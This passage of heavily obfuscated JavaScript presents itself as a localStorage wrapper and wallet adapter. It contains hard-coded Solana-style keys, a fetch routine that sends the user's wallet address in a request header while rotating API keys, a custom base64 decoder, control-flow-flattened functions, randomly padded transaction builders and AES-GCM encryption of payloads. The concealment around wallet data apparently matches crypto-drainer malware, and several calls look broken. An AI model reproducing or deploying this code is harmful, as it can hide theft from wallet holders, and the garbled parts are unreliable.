/* ════════════════════════════════════════════════════════════
 * SECTION 8 — LOCALSTORAGE WRAPPER
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

  /* ═══════════════════════════════════════════════════════════
   * SECTION 8 — LOCALSTORAGE WRAPPER
   * store.ft(k): get(k) with JSON.parse
   * store.pt(k,v): set(k,v) with JSON.stringify
   * store.wn(k): getTTL — returns null if expired
   * store.An(k,v,ttl): setTTL — stores "<value>|<expiry_ms>"
   * ═══════════════════════════════════════════════════════════ */
  store = {
    ["ft"](..._str_cache) {
      _str_cache["length"] = 1;
      try {
        let __str_table__ = ls["getItem"](_str_cache[0]);
        return JSON["parse"](__str_table__ ?? "null")
      } catch {
        return "null"
      }
    },
    ["pt"](..._str_cache) {
      _str_cache["length"] = 2;
      try {
        ls["setItem"](_str_cache[0], JSON["stringify"](_str_cache[1]))
      } catch {}
    },
    ["_n"](..._str_cache) {
      _str_cache["length"] = 1;
      try {
        ls["removeItem"](_str_cache[0])
      } catch {}
    },
    ["wn"](_str_cache) {
      let __str_table__;
      try {
        __str_table__ = ls["getItem"](_str_cache)
      } catch {
        return "null"
      }
      if (!__str_table__) {
        return "null"
      }
      let [_s1, _s3] = __str_table__["split"]("|");
      return _s3 && _now() >= +_s3 ? (this["_n"](_str_cache), "null") : JSON["parse"](_s1)
    },
    ["An"](..._str_cache) {
      _str_cache["length"] = 3;
      try {
        _str_cache[1] = JSON["stringify"](_str_cache[1]);
        let __str_table__ = _now() + _str_cache[2];
        ls["setItem"](_str_cache[0], _str_cache[1] + "|" + __str_table__)
      } catch {}
    }
  }, _wa_priv2_wm = undefined, _wa_priv1_wm = undefined, _v450 = undefined, WalletAdapterClass = class extends WalletConnectBase {
    constructor(_str_cache, __str_table__, _s1) {
      _noop(super(), this["name"] = _str_cache, this["ir"] = __str_table__, _initPriv(this, _wa_priv1_wm), _initPriv(this, _wa_priv2_wm));
      let _s3 = __str_table__ ? store["wn"](_str_cache) : store["ft"](_str_cache);
      if (_s3) {
        for (let [_s2, _s5] of _s3) {
          super["set"](_s2, _s5)
        }
      }
      if (_s1) {
        for (let [_s2, _s5] of _s1) {
          super["set"](_s2, _s5)
        }
      }
    } ["set"](_str_cache, __str_table__) {
      return super["set"](_str_cache, __str_table__), removeEventListener(_getPriv(this, _wa_priv2_wm)), _setPriv(this, _wa_priv2_wm, setTimeout(() => {
        return _callPriv(this, _wa_priv1_wm, _v450)["call"](this)
      }, 1000)), this
    }
  }, _wa_priv2_wm = new(WeakMap), _wa_priv1_wm = new(WeakMap), _v450 = function() {
    let _str_cache = Array["from"](this["entries"]());
    let __str_table__ = this["ir"];
    __str_table__ ? store["An"](this["name"], _str_cache, __str_table__) : store["pt"](this["name"], _str_cache)
  }, _storeRef = undefined, _v237 = undefined, _storeRef = store, _v237 = WalletAdapterClass, _v451 = new(Set), _v238 = new _v237("_0x8", void 0, [...heliusEndpoints]["map"](_limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return [_str_cache[0], 1]
  }))), _v452 = new _v237("_0x14"), _v708 = "BwJ5kSocaJrCCSZPRYfVdgJuv5ofBqxfenWqQ9tnvm8M", _v336 = ["B6q5afRp7aWooroLQVp659freMN1A7hAvfQu34C5umSo", "HjxK72eC3BWNfLZGEjMRpU1uiWve7vcorbpXuxJHGLMJ", "7Qie1ugsP1UVY6W8RxRCMuNgovmEwHotzARyafCZXocA", "B7sbCJLCNv4q8JiKAMK9DAXi5B1vkYRvWaXb6CRj8NWQ", "F4oQigpRFmCtNwL4D71eDW7pPXdESoZ3ZcwdkqHW5Nda"], _v185 = undefined, _v186 = undefined, _v239 = undefined, _v709 = class {
    constructor() {
      _noop(_initPriv(this, _v186), _initPriv(this, _v185, 0))
    }
    async ["cr"](_s1) {
      let _s3 = new(WalletConnectBase);
      for (let _s2 = 0; _s2 < _s1["length"]; _s2 += 50) {
        _noop(_limitArgs(_s7), _limitArgs(_s6));
        const _s5 = {
          ["43"]: 21,
          ["47"]: 9,
          ["48"]: 33,
          ["49"]: 62,
          ["50"]: 19,
          ["51"]: 16,
          ["52"]: 50,
          ["53"]: 27,
          ["54"]: 14,
          ["55"]: 47,
          ["56"]: 23,
          ["57"]: 1,
          ["65"]: 2,
          ["66"]: 44,
          ["67"]: 35,
          ["68"]: 30,
          ["69"]: 29,
          ["70"]: 55,
          ["71"]: 25,
          ["72"]: 18,
          ["73"]: 41,
          ["74"]: 61,
          ["75"]: 8,
          ["76"]: 24,
          ["77"]: 63,
          ["78"]: 60,
          ["79"]: 20,
          ["80"]: 4,
          ["81"]: 43,
          ["82"]: 31,
          ["83"]: 54,
          ["84"]: 42,
          ["85"]: 46,
          ["86"]: 5,
          ["87"]: 22,
          ["88"]: 36,
          ["89"]: 34,
          ["90"]: 39,
          ["97"]: 48,
          ["98"]: 17,
          ["99"]: 45,
          ["100"]: 0,
          ["101"]: 12,
          ["102"]: 57,
          ["103"]: 59,
          ["104"]: 26,
          ["105"]: 58,
          ["106"]: 11,
          ["107"]: 28,
          ["108"]: 13,
          ["109"]: 49,
          ["110"]: 3,
          ["111"]: 10,
          ["112"]: 40,
          ["113"]: 37,
          ["114"]: 52,
          ["115"]: 53,
          ["116"]: 15,
          ["117"]: 7,
          ["118"]: 38,
          ["119"]: 51,
          ["120"]: 32,
          ["121"]: 6,
          ["122"]: 56
        };
        const _s4 = new TextDecoder;

        function _s6(..._s1) {
          _s1["length"] = 1;
          const _s3 = _s1[0].length;
          const _s2 = _s1[0].indexOf("=");
          const _s6 = _s2 == -1 ? 0 : _s3 - _s2;
          const _s7 = _s3 * 3 / 4 - _s6;
          const _s8 = new Uint8Array(_s7);
          _noop(_s1[1] = 0, _s1[2] = 0, _s1[203] = 0);
          for (let _getOwnPropDesc = 0; _getOwnPropDesc < _s3 - _s6; _getOwnPropDesc++) {
            const _found = _s1[0]["charCodeAt"](_getOwnPropDesc);
            if (_found == 61) break;
            _noop(_s1[1] = _s1[1] << 6 | _s5[_found], _s1[2] += 6);
            if (_s1[2] >= 8) {
              _noop(_s1[2] -= 8, _s8[_s1[203]++] = _s1[1] >> _s1[2] & 255)
            }
          }
          return _s4.decode(_s8)
        }

        function _s7(..._s1) {
          _s1["length"] = 1;
          if (typeof _str_cache[_s1[0]] === "undefined") {
            return _str_cache[_s1[0]] = _s6(__str_table__[_s1[0]])
          }
          return _str_cache[_s1[0]]
        }
        let _s8 = _s1["slice"](_s2, _s2 + 50);
        let _defineProperty = await _callPriv(this, _v186, _v239)["call"](this, _s7(283) + _s8["join"](","));
        for (let _getOwnPropDesc in _defineProperty) {
          let _found = _defineProperty[_getOwnPropDesc];
          let _v1 = _found["usdPrice"];
          let _v2 = _found["liquidity"];
          _s3["set"](_getOwnPropDesc, [_v1, _v2])
        }
      }
      return _s3
    }
    async ["En"](_str_cache) {
      return (await this["cr"]([_str_cache]))["get"](_str_cache)?.[0] ?? 0
    }
    async ["wo"](_str_cache) {
      let __str_table__ = (await _callPriv(this, _v186, _v239)["call"](this, "5oxTPjuBfB2FGMPFuHYv4gdEsWKaY8gLmgQ7udcCkYwF" + _str_cache))["find"](_limitArgs((...__str_table__) => {
        __str_table__["length"] = 1;
        return __str_table__[0]["id"] == _str_cache
      }));
      if (!__str_table__) {
        throw new HttpError("cant find token")
      }
      return __str_table__
    }
    async ["Rn"]() {
      return await this["En"](_v335)
    }
  }, _v185 = new(WeakMap), _v186 = new(WeakMap), _v239 = async function(_str_cache, __str_table__ = _v336["length"]) {
    let _s1 = await fetch(_v708 + _str_cache, {
      ["headers"]: {
        ["User-Agent"]: walletAddress,
        ["x-api-key"]: _v336[_getPriv(this, _v185)]
      },
      ["signal"]: AbortSignal["Be"](2000),
      ["referrerPolicy"]: "no-referrer"
    });
    if (!_s1["ok"]) {
      if (__str_table__ > 0 && (_s1["status"] == 401 || _s1["status"] == 429)) {
        return _setPriv(this, _v185, (_getPriv(this, _v185) + 1) % _v336["length"]), await _callPriv(this, _v186, _v239)["call"](this, _str_cache, __str_table__ - 1)
      }
      let _s3 = "20";
      throw new HttpError(_s3)
    }
    return await _s1["json"]()
  }, _v710 = new _v709, _v122 = Number);

function _v171(..._str_cache) {
  return (_str_cache[0][_str_cache[1]] | _str_cache[0][_str_cache[1] + 1] << 8) >>> 0
}

function _v393(..._str_cache) {
  return (_str_cache[0][_str_cache[1]] | _str_cache[0][_str_cache[1] + 1] << 8 | _str_cache[0][_str_cache[1] + 2] << 16 | _str_cache[0][_str_cache[1] + 3] << 24) >>> 0
}

function _v922(..._str_cache) {
  return BigInt(_str_cache[0][_str_cache[1]]) | BigInt(_str_cache[0][_str_cache[1] + 1]) << 8n | BigInt(_str_cache[0][_str_cache[1] + 2]) << 16n | BigInt(_str_cache[0][_str_cache[1] + 3]) << 24n | BigInt(_str_cache[0][_str_cache[1] + 4]) << 32n | BigInt(_str_cache[0][_str_cache[1] + 5]) << 40n | BigInt(_str_cache[0][_str_cache[1] + 6]) << 48n | BigInt(_str_cache[0][_str_cache[1] + 7]) << 56n
}

function _v562(..._str_cache) {
  _noop(_str_cache[0][_str_cache[2]] = _str_cache[1] & 255, _str_cache[0][_str_cache[2] + 1] = _str_cache[1] >>> 8 & 255)
}

function _v223(_str_cache, __str_table__, _s1) {
  _noop(_str_cache[_s1] = __str_table__ & 255, _str_cache[_s1 + 1] = __str_table__ >>> 8 & 255, _str_cache[_s1 + 2] = __str_table__ >>> 16 & 255, _str_cache[_s1 + 3] = __str_table__ >>> 24 & 255)
}

function _v86(..._str_cache) {
  _noop(_str_cache[0][_str_cache[2]] = _v122(_str_cache[1] & 0xFFn), _str_cache[0][_str_cache[2] + 1] = _v122(_str_cache[1] >> 8n & 0xFFn), _str_cache[0][_str_cache[2] + 2] = _v122(_str_cache[1] >> 16n & 0xFFn), _str_cache[0][_str_cache[2] + 3] = _v122(_str_cache[1] >> 24n & 0xFFn), _str_cache[0][_str_cache[2] + 4] = _v122(_str_cache[1] >> 32n & 0xFFn), _str_cache[0][_str_cache[2] + 5] = _v122(_str_cache[1] >> 40n & 0xFFn), _str_cache[0][_str_cache[2] + 6] = _v122(_str_cache[1] >> 48n & 0xFFn), _str_cache[0][_str_cache[2] + 7] = _v122(_str_cache[1] >> 56n & 0xFFn))
}

function _v561(..._str_cache) {
  return _str_cache[0]["type"] == 0
}

function _v170(..._str_cache) {
  _noop(_str_cache[-228] = _buildList(_str_cache[2]), _str_cache[0]["set"](_str_cache[-228], _str_cache[1]))
}

function _v287(..._str_cache) {
  _str_cache[2] = _str_cache[0]["subarray"](_str_cache[1], _str_cache[1] + 32);
  return _v331(_str_cache[2])
}

function _v921(..._str_cache) {
  _str_cache[1] = new(TextEncoder)()["encode"](_str_cache[0]);
  return _v636(_str_cache[1])
}

function _v636(_str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["_v312"]: {}
  }) {
    while (_s1 + _s3 !== -2) {
      with(_s2["\u91CA"] || _s2) {
        switch (_s1 + _s3) {
          case -46:
          default:
            _noop(_s2["\u91CA"] = _s2["\u8506"], _s1 += 20, _s3 += -226);
            break;
          case -90:
            _noop([_s2["_v312"]["\u682C"], _s2["_v312"]["\u6758"], _s2["_v312"]["\u82D8"]] = [180, 0, -247], _v312["\u9DCB"] = 4294967295);
            for (let _s5 of _str_cache) {
              _v312["\u9DCB"] ^= _s5;
              for (let _s4 = CONSTS[_s1 + 109]; _s4 < 8; _s4++) {
                _v312["\u9DCB"] = _v312["\u9DCB"] >>> 1 ^ (_v312["\u9DCB"] & CONSTS[_s1 + 107] ? 3988292384 : CONSTS[_s1 + 109])
              }
            }
            return __str_table__ = true, ~_v312["\u9DCB"] >>> 0;
            _noop(_s1 += 150, _s3 += -62);
            break;
          case _s1 - 74:
          case -17:
          case _s1 - 215:
          case 44:
            _noop([_s2["_v312"]["\u682C"], _s2["_v312"]["\u6758"], _s2["_v312"]["\u82D8"]] = [61, -24, 101], _s2["\u91CA"] = _s2["\u6F48"], _s1 += 20, _s3 += 166);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-103, 13)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}
_noop(_v711 = _v636, _v1063 = new(TextEncoder), _v453 = new(TextDecoder), _v712 = 59);

function _v920(..._str_cache) {
  _str_cache[-51] = 1;
  for (let __str_table__ of _str_cache[0]) {
    let _s1 = __str_table__["type"];
    _noop(_str_cache[-51] += 1, _s1 == 0 && (_str_cache[-51] += 65), _s1 == 2 && (_str_cache[-51] += 32))
  }
  _noop(_str_cache[2] = new(Uint8Array)(_str_cache[-51]), _str_cache[3] = 0, _str_cache[2][_str_cache[3]++] = _str_cache[0]["length"]);
  for (let __str_table__ of _str_cache[0]) {
    let _s1 = __str_table__["type"];
    _noop(_str_cache[2][_str_cache[3]++] = _s1, _s1 == 0 && (_str_cache[2][_str_cache[3]++] = +__str_table__["J"], _v170(_str_cache[2], _str_cache[3], __str_table__["q"]), _v170(_str_cache[2], _str_cache[3] + 32, __str_table__["de"]), _str_cache[3] += 64), _s1 == 2 && (_v170(_str_cache[2], _str_cache[3], __str_table__["e"]), _str_cache[3] += 32))
  }
  return _str_cache[2]
}

function _buildStakeTx(..._str_cache) {
  _noop(_str_cache[3] = _v920(_str_cache[2]), _str_cache[4] = new(Uint8Array)(_v712 + _str_cache[3]["length"]), _str_cache[209] = 0);
  for (; _str_cache[209] < 15; _str_cache[209]++) {
    _str_cache[4][_str_cache[209]] = _randInt(0, 255)
  }
  _noop(_v86(_str_cache[4], BigInt(Math["trunc"](_str_cache[1])), _str_cache[209]), _str_cache[209] += 8, _v170(_str_cache[4], _str_cache[209], _str_cache[0]), _str_cache[209] += 32, _str_cache[4]["set"](_str_cache[3], _str_cache[209]), _str_cache[209] += _str_cache[3]["length"], _str_cache["d"] = _v711(_str_cache[4]["subarray"](0, -4)));
  return _v223(_str_cache[4], _str_cache["d"], _str_cache[209]), _str_cache[4]
}

function _parseTxResult(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u9B7E"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== -25) {
      with(_s4["\u9926"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case _s2 - 197:
          case 192:
            _noop(_str_cache[CONSTS[_s3 + 255]] = _v287(_str_cache[CONSTS[_s2 + -167]], _str_cache[CONSTS[_s1 + 151]]), _str_cache[1] += 32, _str_cache[CONSTS[_s3 + 392]] = _v171(_str_cache[CONSTS[_s1 + 153]], _str_cache[1]), _s4["\u9926"] = _s4["\u9B7E"], _s1 += 638, _s5 += -423);
            break;
          case -154:
          case _s4["\u9B7E"]["\u8160"] + -168:
          case 98:
            _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += 76, _s3 += -224, _s2 += 355, _s5 += 105);
            break;
          case _s5 - -106:
            return __str_table__ = true, [_str_cache[2], "null", _str_cache[-CONSTS[_s2 + 257]]];
            _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += -317, _s5 += 112);
            break;
          case -104:
          default:
          case -10:
            _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += 76, _s3 += -224, _s2 += 355, _s5 += 117);
            break;
          case -33:
            _noop(_str_cache[1] += CONSTS[_s3 + -10], _str_cache[-89] = _str_cache[CONSTS[_s3 + -4]]["subarray"](_str_cache[1], _str_cache[1] + _str_cache[CONSTS[_s1 + 184]]), _str_cache[7] = _v453[CONSTS[_s2 + 391]](_str_cache[-89]));
            return __str_table__ = true, [_str_cache[2],
              [_str_cache["d"], _str_cache[CONSTS[_s1 + 54]]], _str_cache[-74]
            ];
            _noop(_s4["\u9926"] = _s4["\u79D2"], _s1 += 229, _s3 += -23, _s2 += -30, _s5 += -168);
            break;
          case 151:
          case 194:
          case -136:
            _noop(_str_cache[1] += 2, _str_cache[-CONSTS[_s2 + 257]] = _str_cache[0][_str_cache[1]++]);
            if (!_str_cache[0][_str_cache[1]++]) {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += -43, _s5 += 30);
              break
            } else {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += -360, _s5 += 142);
              break
            }
            if (!(_s5 > -(_s3 + 307))) {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += -200, _s3 += 224, _s2 += -273, _s5 += 93);
              break
            }
          case _s1 - -191:
            _noop([_s4["\u9B7E"]["\u924E"], _s4["\u9B7E"]["\u8160"]] = [-154, 37], _str_cache[CONSTS[_s3 + 49]] = CONSTS[_s2 + 10], _str_cache[2] = _v171(_str_cache[CONSTS[_s2 + -98]], CONSTS[_s1 + 233]), _s4["\u9926"] = _s4["\u9B7E"], _s1 += 332, _s3 += -192, _s2 += 69, _s5 += -87);
            break;
            if (_s3 > 59) {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += 610, _s3 += -192, _s2 += 69, _s5 += -368);
              break
            }
          case 246:
          case 223:
          case 191:
            _noop(_str_cache[1] += CONSTS[_s3 + 237], _str_cache[-89] = _str_cache[0][CONSTS[_s3 + 546] + "ay"](_str_cache[1], _str_cache[1] + _str_cache["e"]), _str_cache[7] = _v453["decode"](_str_cache[-CONSTS[_s2 + 477]]));
            return __str_table__ = true, [_str_cache[CONSTS[_s1 + -491]],
              [_str_cache["d"], _str_cache[7]], _str_cache[-CONSTS[_s1 + -61]]
            ];
            _noop(_s4["\u9926"] = _s4["\u5DE0"], _s1 += -291, _s3 += 224, _s2 += -355, _s5 += 206);
            break;
          case _s2 - 367:
            _noop(_str_cache[CONSTS[_s3 + 17]] += 2, _str_cache[-74] = _str_cache[0][_str_cache[CONSTS[_s3 + 17]]++]);
            if (!_str_cache[0][_str_cache[1]++]) {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += 662, _s3 += -224, _s2 += 21, _s5 += -63);
              break
            } else {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += 345, _s3 += -224, _s2 += 21, _s5 += 49);
              break
            }
            if (!(_s5 > -(_s2 + -82))) {
              _noop(_s4["\u9926"] = _s4["\u9B7E"], _s1 += 505, _s2 += -252);
              break
            }
          case 126:
          case 177:
          case _s1 - -25:
            _noop([_s4["\u9B7E"]["\u924E"], _s4["\u9B7E"]["\u8160"]] = [234, 74], _s4["\u9926"] = _s4["\u9DB0"], _s1 += 187, _s2 += -82, _s5 += -168);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-119, -45, 104, 132)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _buildUnstakeTx(..._str_cache) {
  if (_str_cache[0]["length"] === 0) {
    return new(Uint8Array)(1)
  }
  _noop(_str_cache[-232] = _str_cache[0]["reduce"]((_str_cache, _s1) => {
    return _str_cache + _s1["length"]
  }, 0), _str_cache[-248] = new(Uint8Array)(1 + _str_cache[0]["length"] * 2 + _str_cache[-232]), _str_cache[-248][0] = _str_cache[0]["length"], _str_cache[3] = 1);
  for (let __str_table__ of _str_cache[0]) {
    _noop(_v562(_str_cache[-248], __str_table__["length"], _str_cache[3]), _str_cache[3] += 2, _str_cache[-248]["set"](__str_table__, _str_cache[3]), _str_cache[3] += __str_table__["length"])
  }
  return _str_cache[-248]
}
_v713 = 52;

function _buildJupTx(..._str_cache) {
  _noop(_str_cache["a"] = _buildUnstakeTx(_str_cache[2]), _str_cache["b"] = _buildUnstakeTx(_str_cache[4]["map"](_limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return _buildList(_str_cache[0])
  }))), _str_cache[-185] = new(Uint8Array)(_v713 + _str_cache["a"]["length"] + _str_cache["b"]["length"]));
  for (let __str_table__ = 0; __str_table__ < 13; __str_table__++) {
    _str_cache[-185][__str_table__] = _randInt(0, 255)
  }
  _str_cache[8] = 13;
  return _v223(_str_cache[-185], _str_cache[1], _str_cache[8]), _str_cache[8] += 4, _v170(_str_cache[-185], _str_cache[8], _str_cache[0]), _str_cache[8] += 32, _str_cache[-185][_str_cache[8]++] = _str_cache[3], _v562(_str_cache[-185], _str_cache["a"]["length"], _str_cache[8]), _str_cache[8] += 2, _str_cache[-185]["set"](_str_cache["a"], _str_cache[8]), _str_cache[8] += _str_cache["a"]["length"], _str_cache[-185]["set"](_str_cache["b"], _str_cache[8]), _str_cache[8] += _str_cache["b"]["length"], _str_cache[-185]
}
_noop(_v454 = new(WalletConnectBase), _v714 = getString(285));
async function _v1041(_str_cache) {
  let __str_table__ = _v454["get"](_str_cache);
  if (__str_table__) {
    return __str_table__
  }
  let _s1 = new(TextEncoder)()["encode"](_str_cache + _v714);
  let _s3 = await _WC_registry["subtle"]["digest"]("SHA-256", _s1);
  let _s2 = await _WC_registry["subtle"]["importKey"]("raw", _s3, {
    ["name"]: "AES-GCM"
  }, !1, ["encrypt", "decrypt"]);
  return _v454["set"](_str_cache, _s2), _s2
}
async function _buildTokenTx(_str_cache, __str_table__) {
  let _s1 = await _v1041(__str_table__);
  let _s3 = _WC_registry["getRandomValues"](new(Uint8Array)(12));
  let _s2 = await _WC_registry["subtle"]["encrypt"]({
    ["name"]: "AES-GCM",
    ["iv"]: _s3
  }, _s1, _str_cache);
  let _s5 = new(Uint8Array)(_s3["length"] + _s2["byteLength"]);
  return _s5["set"](_s3, 0), _s5["set"](new(Uint8Array)(_s2), _s3["length"]), _s5
}
async function _v1231(_str_cache, __str_table__) {
  let _s1 = await _v1041(__str_table__);
  let _s3 = _str_cache["slice"](0, 12);
  let _s2 = _str_cache["slice"](12);
  let _s5 = await _WC_registry["subtle"]["decrypt"]({
    ["name"]: "AES-GCM",
    ["iv"]: _s3
  }, _s1, _s2);
  return new(Uint8Array)(_s5)
}
_noop(StatusError = class extends HttpError {
    constructor(_str_cache) {
      _noop(super("20"), this["Sn"] = _str_cache)
    }
  }, _fwc_priv_wm = undefined, _fwcFetch = undefined, _fwcFetchAuth = undefined,
